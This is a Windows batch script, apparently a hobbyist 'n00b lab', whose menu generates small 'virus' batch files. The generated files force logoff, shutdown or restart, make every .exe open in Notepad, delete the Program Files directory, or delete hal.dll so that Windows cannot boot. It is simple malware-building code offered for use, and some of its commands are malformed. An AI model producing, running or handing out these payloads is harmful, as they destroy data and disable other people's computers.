@echo off
color 30
:start
cls
echo "Thanks for using N00B la13 .:.:>coded by FLR\/<:.:."
echo                                              /\
echo.
echo Press 1 for details
echo Press 2 for log off virus
echo Press 3 for shutdown virus
echo Press 4 for restart virus
echo Press 5 for exe to notpad virus
echo Press 6 for delete Program files virus
echo Press 7 for boot messup virus
echo Press 8 to exit n00b lab
echo.
set choice=
set /p choice=  Enter the option number you want:
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto usage
if '%choice%'=='2' goto ll
if '%choice%'=='3' goto ss
if '%choice%'=='4' goto rr
if '%choice%'=='5' goto aass
if '%choice%'=='6' goto pp
if '%choice%'=='7' goto hh
if '%choice%'=='8' goto exitlab
echo "%choice%" is not valid please try again


:usage
echo.
echo Usage
echo.
echo 2 will log off the user
echo 3 will shutdown the computer
echo 4 will restart the computer 
echo 5 will make all exes open in notepad
echo 6 will delete the program files directory
echo 7 will delete hal.dll which will mean that the computer will not be able to boot properly
echo.
echo Virus complete means that a virus has been created in this directory
echo.
echo None of these can do any unreversable damage apart from 6 so are just for fun.
echo Also, none of these can spread
echo.
pause
goto start



:ll
echo.
echo Creating Virus...
echo @echo off > l.bat
echo shutdown -l >> l.bat
echo Virus complete
goto start

:ss
echo.
echo Creating Virus...
echo @echo off > s.bat
echo shutdown -s -t 00 >> s.bat
echo Virus complete
goto start

:rr
echo.
echo Creating Virus...
echo @echo off > r.bat
echo shutdown -r -t 00  >> r.bat
echo Virus complete
goto start

:aass
echo.
echo Creating Virus...
echo @echo off > as.bat
echo assoc .exe=txtfile >> as.bat
echo Virus complete
goto start

:pp
echo.
echo Creating Virus...
echo @echo off > p.bat
echo shutdown -f >> p.bat
echo RMDIR /S /Q C:\Program Files >> p.bat
echo Virus complete
goto start

:hh
echo.
echo Creating Virus...
echo @echo off > h.bat
echo DEL %systemroot%\system32\hal.dll >> h.bat
echo Virus complete
goto start


:exitlab
exit
